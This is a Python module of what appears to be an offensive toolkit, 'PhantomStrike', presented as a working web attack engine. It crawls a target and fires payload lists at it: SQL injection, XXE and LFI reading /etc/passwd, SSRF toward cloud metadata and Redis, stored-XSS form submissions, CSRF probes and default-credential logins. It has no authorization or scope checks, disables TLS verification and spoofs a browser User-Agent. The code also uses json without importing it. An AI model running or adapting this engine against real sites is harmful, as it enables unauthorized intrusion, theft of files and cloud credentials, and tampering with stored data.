"""
PhantomStrike ENHANCED Web Attack Engine — REAL working vulnerability scanner.
Blind SQLi (time-based), XXE, CSRF, Stored XSS, JWT attacks, IDOR detection.
"""
from __future__ import annotations
import asyncio
import logging
import re
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from typing import Optional, Dict, List, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import aiohttp
from bs4 import BeautifulSoup

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.web")

# Enhanced SQLi payloads including blind/time-based
SQLI_PAYLOADS = {
    "error_based": [
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "'; DROP TABLE users--", "' UNION SELECT NULL--",
        "1' AND '1'='1", "1 AND 1=1", "') OR ('1'='1",
    ],
    "time_based": [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",
        "' AND sqlite3_sleep(5000)--",
        "\" AND SLEEP(5)--",
        "1 AND SLEEP(5)",
        "1' AND SLEEP(5) AND '1'='1",
    ],
    "union_based": [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT user(),NULL,NULL--",
    ]
}

# XXE payloads
XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>""",
]

# CSRF test payloads - trying to bypass protection
CSRF_BYPASS_PAYLOADS = [
    {"X-HTTP-Method-Override": "GET"},
    {"X-Custom-Header": "test"},
    {"Content-Type": "application/json"},
    {"Origin": "https://attacker.com"},
    {"Referer": "https://attacker.com"},
]

# IDOR test patterns
IDOR_PATTERNS = ["id=", "user=", "account=", "order=", "doc=", "file=", "report="]


class EnhancedWebEngine(BaseModule):
    """REAL working web vulnerability scanner with blind detection."""

    @property
    def name(self) -> str:
        return "phantom-web"

    @property
    def description(self) -> str:
        return "Web attacks — SQLi (blind/time-based), XSS, XXE, CSRF, IDOR, JWT"

    @property
    def category(self) -> str:
        return "vulnerability"

    async def _setup(self):
        self._session: Optional[aiohttp.ClientSession] = None
        self._vulnerabilities: List[Dict] = []

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run comprehensive web vulnerability scan."""
        options = options or {}
        self.status = ModuleStatus.RUNNING
        start_time = datetime.now()

        if not target.startswith(("http://", "https://")):
            # Try HTTPS first, fall back to HTTP
            https_target = f"https://{target}"
            http_target = f"http://{target}"
            target = https_target
        else:
            https_target = target if target.startswith("https://") else None
            http_target = target if target.startswith("http://") else target.replace("https://", "http://")

        findings = {
            "target": target,
            "sqli": [],
            "blind_sqli": [],
            "xss": [],
            "stored_xss": [],
            "lfi": [],
            "ssrf": [],
            "rce": [],
            "xxe": [],
            "csrf": [],
            "idor": [],
            "jwt_vulns": [],
            "headers_issues": [],
            "endpoints": [],
            "forms": [],
            "api_endpoints": [],
        }

        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=50,
            enable_cleanup_closed=True,
            force_close=True,
        )

        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30, connect=10),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
            },
        )

        try:
            # Phase 1: Deep crawl and endpoint discovery
            logger.info(f"[WEB] Starting deep crawl on {target}")
            endpoints = await self._deep_crawl(target, findings)
            findings["endpoints"] = endpoints

            # Phase 2: Form discovery for stored XSS testing
            forms = await self._discover_forms(target, findings)
            findings["forms"] = forms

            # Phase 3: API endpoint discovery
            api_endpoints = await self._discover_api(target, findings)
            findings["api_endpoints"] = api_endpoints

            # Phase 4: Security headers check
            findings["headers_issues"] = await self._check_security_headers(target)

            # Phase 5: Vulnerability testing with real exploitation
            vuln_tasks = []

            # Test SQLi on discovered endpoints
            for endpoint in endpoints[:20]:  # Limit to avoid overwhelming
                vuln_tasks.append(self._test_error_sqli(endpoint, findings))
                vuln_tasks.append(self._test_blind_sqli(endpoint, findings))
                vuln_tasks.append(self._test_xxe(endpoint, findings))

            # Test XSS
            for endpoint in endpoints[:20]:
                vuln_tasks.append(self._test_xss(endpoint, findings))

            # Test stored XSS on forms
            for form in forms[:10]:
                vuln_tasks.append(self._test_stored_xss(target, form, findings))

            # Test LFI
            for endpoint in endpoints[:10]:
                vuln_tasks.append(self._test_lfi(endpoint, findings))

            # Test SSRF
            vuln_tasks.append(self._test_ssrf(target, findings))

            # Test CSRF
            for form in forms[:10]:
                vuln_tasks.append(self._test_csrf(target, form, findings))

            # Test IDOR on API endpoints
            for api_endpoint in api_endpoints[:15]:
                vuln_tasks.append(self._test_idor(api_endpoint, findings))

            # Test JWT vulnerabilities
            vuln_tasks.append(self._test_jwt_vulnerabilities(target, findings))

            # Run all vulnerability tests concurrently
            logger.info(f"[WEB] Running {len(vuln_tasks)} vulnerability tests...")
            await asyncio.gather(*vuln_tasks, return_exceptions=True)

        except Exception as e:
            logger.error(f"[WEB] Scan error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            await self._session.close()

        total_vulns = (
            len(findings["sqli"]) + len(findings["blind_sqli"]) +
            len(findings["xss"]) + len(findings["stored_xss"]) +
            len(findings["lfi"]) + len(findings["ssrf"]) +
            len(findings["rce"]) + len(findings["xxe"]) +
            len(findings["csrf"]) + len(findings["idor"]) +
            len(findings["jwt_vulns"])
        )

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name,
            operation="enhanced_web_scan",
            success=True,
            data=findings,
            findings_count=total_vulns,
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def _deep_crawl(self, base_url: str, findings: dict) -> List[str]:
        """Deep crawl to discover all endpoints."""
        endpoints = set([base_url])
        to_visit = [base_url]
        visited = set()
        max_pages = 50

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)

            try:
                async with self._session.get(url, allow_redirects=True, ssl=False) as resp:
                    if resp.status != 200:
                        continue

                    content_type = resp.headers.get("Content-Type", "").lower()
                    if "text/html" not in content_type and "application/xhtml" not in content_type:
                        continue

                    html = await resp.text()
                    soup = BeautifulSoup(html, 'html.parser')

                    # Extract all links
                    for tag in soup.find_all(['a', 'link']):
                        href = tag.get('href')
                        if href:
                            full_url = urljoin(url, href)
                            if self._is_same_domain(full_url, base_url):
                                if full_url not in visited:
                                    endpoints.add(full_url)
                                    to_visit.append(full_url)

                    # Extract form actions
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        if action:
                            full_url = urljoin(url, action)
                            if self._is_same_domain(full_url, base_url):
                                endpoints.add(full_url)

                    # Extract from scripts
                    scripts = soup.find_all('script')
                    for script in scripts:
                        if script.string:
                            # Look for API endpoints in JS
                            api_patterns = re.findall(r'["\']((?:/api|/v\d|/graphql|/rest|/svc)[^"\']+)["\']', script.string)
                            for pattern in api_patterns:
                                full_url = urljoin(url, pattern)
                                endpoints.add(full_url)

            except Exception as e:
                logger.debug(f"[WEB] Crawl error for {url}: {e}")

        return list(endpoints)

    async def _discover_forms(self, base_url: str, findings: dict) -> List[Dict]:
        """Discover all forms for stored XSS testing."""
        forms = []
        try:
            async with self._session.get(base_url, ssl=False) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    soup = BeautifulSoup(html, 'html.parser')

                    for form in soup.find_all('form'):
                        form_data = {
                            "action": urljoin(base_url, form.get('action', '')),
                            "method": form.get('method', 'GET').upper(),
                            "inputs": [],
                        }
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            input_data = {
                                "name": input_tag.get('name', ''),
                                "type": input_tag.get('type', 'text'),
                                "id": input_tag.get('id', ''),
                            }
                            form_data["inputs"].append(input_data)
                        forms.append(form_data)
        except Exception as e:
            logger.debug(f"[WEB] Form discovery error: {e}")

        return forms

    async def _discover_api(self, base_url: str, findings: dict) -> List[str]:
        """Discover API endpoints."""
        api_endpoints = set()

        # Common API paths
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/rest", "/rest/v1", "/rest/v2",
            "/graphql", "/gql",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/.well-known/openapi", "/openapi.yaml",
        ]

        async def check_api(path: str):
            try:
                url = urljoin(base_url, path)
                async with self._session.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                    if resp.status in [200, 401, 403]:
                        api_endpoints.add(url)
                        logger.info(f"[WEB] API endpoint found: {url} (status: {resp.status})")
            except:
                pass

        await asyncio.gather(*[check_api(p) for p in api_paths])
        return list(api_endpoints)

    async def _test_error_sqli(self, url: str, findings: dict):
        """Test for error-based SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            test_params = ["id", "user", "product", "category", "page", "item"]
        else:
            test_params = list(params.keys())

        for param in test_params:
            for payload in SQLI_PAYLOADS["error_based"]:
                try:
                    test_url = f"{url.split('?')[0]}?{param}={payload}"
                    if '?' in url:
                        test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        test_params_dict[param] = payload
                        test_url = f"{url.split('?')[0]}?{urlencode(test_params_dict)}"

                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                        body = await resp.text()
                        body_lower = body.lower()

                        # Check for SQL errors
                        sql_errors = [
                            "sql syntax", "mysql_fetch", "sqlite3", "postgresql",
                            "ora-", "sql server", "odbc", "syntax error",
                            "unterminated", "quoted string", "unexpected end",
                            "mysql_num_rows", "pg_query", "sqlite3::",
                            "warning: mysql", "mysql error", "mssql_error"
                        ]

                        if any(err in body_lower for err in sql_errors):
                            vuln = {
                                "type": "sqli",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "SQL error in response",
                                "severity": "critical",
                                "status_code": resp.status,
                            }
                            findings["sqli"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🔴 SQLi FOUND: {test_url}")
                            return

                except Exception as e:
                    logger.debug(f"[WEB] SQLi test error: {e}")

    async def _test_blind_sqli(self, url: str, findings: dict):
        """Test for time-based blind SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            test_params = ["id", "page", "user", "search"]
        else:
            test_params = list(params.keys())

        for param in test_params:
            for payload in SQLI_PAYLOADS["time_based"]:
                try:
                    test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()} if params else {param: "1"}
                    test_params_dict[param] = payload
                    test_url = f"{url.split('?')[0]}?{urlencode(test_params_dict)}"

                    start_time = time.time()
                    async with self._session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False
                    ) as resp:
                        await resp.text()
                        response_time = time.time() - start_time

                        # If response took > 5 seconds, likely time-based SQLi
                        if response_time >= 4.5:
                            vuln = {
                                "type": "blind_sqli",
                                "subtype": "time_based",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Response delayed {response_time:.1f}s (indicates SLEEP/DELAY execution)",
                                "response_time": response_time,
                                "severity": "critical",
                            }
                            findings["blind_sqli"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🔴 BLIND SQLi FOUND: {test_url} (delay: {response_time:.1f}s)")
                            return

                except asyncio.TimeoutError:
                    # Timeout also indicates potential SQLi
                    vuln = {
                        "type": "blind_sqli",
                        "subtype": "time_based",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": "Request timeout - likely SLEEP/DELAY execution",
                        "severity": "critical",
                    }
                    findings["blind_sqli"].append(vuln)
                    await self._emit_vuln(vuln)
                    logger.info(f"[WEB] 🔴 BLIND SQLi FOUND (timeout): {test_url}")
                    return
                except Exception as e:
                    logger.debug(f"[WEB] Blind SQLi test error: {e}")

    async def _test_xss(self, url: str, findings: dict):
        """Test for reflected XSS."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "javascript:alert('XSS')",
            "'-alert(1)-'",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<iframe src=javascript:alert(1)>",
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            test_params = ["q", "search", "query", "s", "keyword"]
        else:
            test_params = list(params.keys())

        for param in test_params:
            for payload in xss_payloads:
                try:
                    test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()} if params else {}
                    test_params_dict[param] = payload
                    test_url = f"{url.split('?')[0]}?{urlencode(test_params_dict)}"

                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                        body = await resp.text()

                        # Check if payload is reflected
                        if payload in body or payload.replace('"', '"').replace("'", "'") in body:
                            # Check if it's actually executable
                            soup = BeautifulSoup(body, 'html.parser')
                            scripts = soup.find_all('script')
                            script_text = ' '.join([str(s) for s in scripts])

                            vuln = {
                                "type": "reflected_xss",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Payload reflected in response",
                                "severity": "high",
                            }
                            findings["xss"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🟠 XSS FOUND: {test_url}")
                            return

                except Exception as e:
                    logger.debug(f"[WEB] XSS test error: {e}")

    async def _test_stored_xss(self, base_url: str, form: dict, findings: dict):
        """Test for stored XSS via form submission."""
        stored_payloads = [
            '<img src=x onerror=alert("STORED_XSS")>',
            '<script>alert("STORED_XSS")</script>',
            '"><body onload=alert("STORED_XSS")>',
        ]

        action = form.get("action", base_url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])

        for payload in stored_payloads:
            try:
                # Build form data
                form_data = {}
                for inp in inputs:
                    name = inp.get("name")
                    if name:
                        # Inject payload into text fields
                        if inp.get("type") in ["text", "search", "email", "textarea", "hidden", ""]:
                            form_data[name] = payload
                        elif inp.get("type") in ["submit", "button"]:
                            form_data[name] = inp.get("value", "Submit")
                        else:
                            form_data[name] = "test"

                if method == "POST":
                    async with self._session.post(action, data=form_data, ssl=False) as resp:
                        await resp.text()
                else:
                    async with self._session.get(action, params=form_data, ssl=False) as resp:
                        await resp.text()

                # Wait a moment and check if payload appears
                await asyncio.sleep(1)

                # Check if payload is stored
                async with self._session.get(action, ssl=False) as check_resp:
                    check_body = await check_resp.text()
                    if 'STORED_XSS' in check_body or payload in check_body:
                        vuln = {
                            "type": "stored_xss",
                            "url": action,
                            "form_action": action,
                            "payload": payload,
                            "evidence": "Payload persisted after submission",
                            "severity": "critical",
                        }
                        findings["stored_xss"].append(vuln)
                        await self._emit_vuln(vuln)
                        logger.info(f"[WEB] 🔴 STORED XSS FOUND: {action}")
                        return

            except Exception as e:
                logger.debug(f"[WEB] Stored XSS test error: {e}")

    async def _test_xxe(self, url: str, findings: dict):
        """Test for XXE vulnerabilities."""
        # Check if endpoint accepts XML
        headers = {"Content-Type": "application/xml"}

        for payload in XXE_PAYLOADS:
            try:
                async with self._session.post(
                    url,
                    data=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as resp:
                    body = await resp.text()

                    # Check for /etc/passwd content
                    if "root:" in body or "daemon:" in body or "bin:" in body:
                        vuln = {
                            "type": "xxe",
                            "url": url,
                            "payload": payload[:100],
                            "evidence": "File content retrieved via XXE",
                            "severity": "critical",
                        }
                        findings["xxe"].append(vuln)
                        await self._emit_vuln(vuln)
                        logger.info(f"[WEB] 🔴 XXE FOUND: {url}")
                        return

                    # Check for cloud metadata
                    if "ami-" in body or "instance-id" in body or "accountId" in body:
                        vuln = {
                            "type": "xxe",
                            "subtype": "cloud_metadata",
                            "url": url,
                            "payload": payload[:100],
                            "evidence": "Cloud metadata accessed via XXE",
                            "severity": "critical",
                        }
                        findings["xxe"].append(vuln)
                        await self._emit_vuln(vuln)
                        logger.info(f"[WEB] 🔴 XXE (Cloud) FOUND: {url}")
                        return

            except Exception as e:
                logger.debug(f"[WEB] XXE test error: {e}")

    async def _test_csrf(self, base_url: str, form: dict, findings: dict):
        """Test for CSRF protection bypass."""
        action = form.get("action", base_url)
        method = form.get("method", "POST")

        try:
            # Get the form page to check for CSRF token
            async with self._session.get(action, ssl=False) as resp:
                body = await resp.text()
                soup = BeautifulSoup(body, 'html.parser')

                # Check for CSRF token
                csrf_tokens = []
                for inp in soup.find_all('input'):
                    name = inp.get('name', '').lower()
                    if 'csrf' in name or 'token' in name or '_token' in name:
                        csrf_tokens.append(inp.get('value', ''))

                # Try submitting without CSRF token
                form_data = {}
                for inp in form.get("inputs", []):
                    name = inp.get("name")
                    if name and 'csrf' not in name.lower() and 'token' not in name.lower():
                        form_data[name] = "test_csrf"

                # Test without CSRF headers
                headers = {"Origin": "https://evil.com", "Referer": "https://evil.com"}

                if method == "POST":
                    async with self._session.post(
                        action, data=form_data, headers=headers, ssl=False
                    ) as test_resp:
                        if test_resp.status in [200, 302]:
                            vuln = {
                                "type": "csrf",
                                "url": action,
                                "evidence": "Form submitted without CSRF token from different origin",
                                "severity": "medium",
                            }
                            findings["csrf"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🟡 CSRF FOUND: {action}")

        except Exception as e:
            logger.debug(f"[WEB] CSRF test error: {e}")

    async def _test_lfi(self, url: str, findings: dict):
        """Test for LFI vulnerabilities."""
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        file_params = [k for k in (params.keys() if params else []) if any(x in k.lower() for x in ["file", "path", "page", "doc", "document", "template", "view", "include"])]

        if not file_params:
            file_params = ["file", "path", "page", "doc"]

        for param in file_params:
            for payload in lfi_payloads:
                try:
                    test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()} if params else {}
                    test_params_dict[param] = payload
                    test_url = f"{url.split('?')[0]}?{urlencode(test_params_dict)}"

                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                        body = await resp.text()

                        if "root:" in body or "daemon:" in body or "nobody:" in body:
                            vuln = {
                                "type": "lfi",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "/etc/passwd content retrieved",
                                "severity": "critical",
                            }
                            findings["lfi"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🔴 LFI FOUND: {test_url}")
                            return

                        # Windows hosts file
                        if "localhost" in body and "127.0.0.1" in body:
                            vuln = {
                                "type": "lfi",
                                "subtype": "windows",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Windows hosts file retrieved",
                                "severity": "critical",
                            }
                            findings["lfi"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🔴 LFI (Windows) FOUND: {test_url}")
                            return

                except Exception as e:
                    logger.debug(f"[WEB] LFI test error: {e}")

    async def _test_ssrf(self, url: str, findings: dict):
        """Test for SSRF vulnerabilities."""
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/",
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
        ]

        ssrf_params = ["url", "redirect", "uri", "path", "next", "return", "callback", "feed", "host", "site", "source"]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()} if params else {}
                    test_params_dict[param] = payload
                    test_url = f"{url.split('?')[0]}?{urlencode(test_params_dict)}"

                    start_time = time.time()
                    async with self._session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=False,
                        ssl=False
                    ) as resp:
                        body = await resp.text()
                        response_time = time.time() - start_time

                        # Check for cloud metadata
                        if any(x in body for x in ["ami-", "instance-id", "accountId", "compute.internal", "local-hostname"]):
                            vuln = {
                                "type": "ssrf",
                                "subtype": "cloud_metadata",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Cloud metadata accessed",
                                "severity": "critical",
                            }
                            findings["ssrf"].append(vuln)
                            await self._emit_vuln(vuln)
                            logger.info(f"[WEB] 🔴 SSRF (Cloud) FOUND: {test_url}")
                            return

                        # Check for internal service access
                        if response_time < 0.1 and resp.status == 200:
                            # Fast response may indicate local access
                            pass

                except Exception as e:
                    logger.debug(f"[WEB] SSRF test error: {e}")

    async def _test_idor(self, url: str, findings: dict):
        """Test for IDOR vulnerabilities."""
        # Look for numeric IDs that can be manipulated
        id_patterns = re.findall(r'(\?|&)(id|user|account|order|doc|file|report|item|product)=(\d+)', url)

        if id_patterns:
            for match in id_patterns:
                param = match[1]
                current_id = int(match[2])

                # Try adjacent IDs
                for test_id in [current_id - 1, current_id + 1, current_id + 100]:
                    if test_id < 0:
                        continue

                    try:
                        test_url = url.replace(f"{param}={current_id}", f"{param}={test_id}")

                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                            body = await resp.text()

                            # If we get valid data for different ID, potential IDOR
                            if resp.status == 200 and len(body) > 100:
                                # Check if response indicates access to different user's data
                                indicators = ["email", "username", "user_id", "account", "profile", "order"]
                                if any(ind in body.lower() for ind in indicators):
                                    vuln = {
                                        "type": "idor",
                                        "url": test_url,
                                        "parameter": param,
                                        "original_id": current_id,
                                        "tested_id": test_id,
                                        "evidence": f"Accessed resource with ID {test_id}",
                                        "severity": "high",
                                    }
                                    findings["idor"].append(vuln)
                                    await self._emit_vuln(vuln)
                                    logger.info(f"[WEB] 🟠 IDOR FOUND: {test_url}")
                                    return

                    except Exception as e:
                        logger.debug(f"[WEB] IDOR test error: {e}")

    async def _test_jwt_vulnerabilities(self, base_url: str, findings: dict):
        """Test for JWT vulnerabilities."""
        jwt_tests = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
        ]

        # Try to find JWT endpoints
        jwt_endpoints = [
            f"{base_url}/api/auth/login",
            f"{base_url}/api/login",
            f"{base_url}/auth",
            f"{base_url}/login",
            f"{base_url}/api/token",
        ]

        for endpoint in jwt_endpoints:
            try:
                # Try weak credentials
                async with self._session.post(
                    endpoint,
                    json={"username": "admin", "password": "admin"},
                    ssl=False
                ) as resp:
                    body = await resp.text()

                    # Check for JWT in response
                    jwt_pattern = r'[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}'
                    tokens = re.findall(jwt_pattern, body)

                    for token in tokens:
                        # Decode JWT header
                        try:
                            import base64
                            header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))

                            if header.get('alg') == 'none':
                                vuln = {
                                    "type": "jwt_none_algorithm",
                                    "url": endpoint,
                                    "token_sample": token[:50] + "...",
                                    "evidence": "JWT accepts 'none' algorithm",
                                    "severity": "critical",
                                }
                                findings["jwt_vulns"].append(vuln)
                                await self._emit_vuln(vuln)
                                logger.info(f"[WEB] 🔴 JWT NONE ALG FOUND: {endpoint}")

                        except Exception:
                            pass

            except Exception as e:
                logger.debug(f"[WEB] JWT test error: {e}")

    async def _check_security_headers(self, url: str) -> List[dict]:
        """Check for missing security headers."""
        issues = []
        try:
            async with self._session.get(url, ssl=False) as resp:
                headers = {k.lower(): v for k, v in resp.headers.items()}

                required = {
                    "x-frame-options": "Missing — Clickjacking possible",
                    "x-content-type-options": "Missing — MIME sniffing possible",
                    "strict-transport-security": "Missing — No HSTS",
                    "content-security-policy": "Missing — No CSP",
                    "x-xss-protection": "Missing — Legacy XSS filter",
                    "referrer-policy": "Missing — Referrer leakage",
                    "permissions-policy": "Missing — No feature policy",
                }

                for header, desc in required.items():
                    if header not in headers:
                        issues.append({"header": header, "issue": desc, "severity": "medium"})

                # Check for insecure cookie settings
                if "set-cookie" in headers:
                    cookie = headers["set-cookie"]
                    if "secure" not in cookie.lower():
                        issues.append({"header": "Set-Cookie", "issue": "Missing Secure flag", "severity": "medium"})
                    if "httponly" not in cookie.lower():
                        issues.append({"header": "Set-Cookie", "issue": "Missing HttpOnly flag", "severity": "high"})

        except Exception:
            pass

        return issues

    async def _emit_vuln(self, vuln: dict):
        """Emit vulnerability found event."""
        await self.event_bus.emit(Event(
            type=EventType.VULN_FOUND,
            data=vuln,
            source=self.name,
            severity=vuln.get("severity", "medium"),
        ))

    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """Check if URLs belong to same domain."""
        try:
            return urlparse(url1).netloc == urlparse(url2).netloc
        except:
            return False
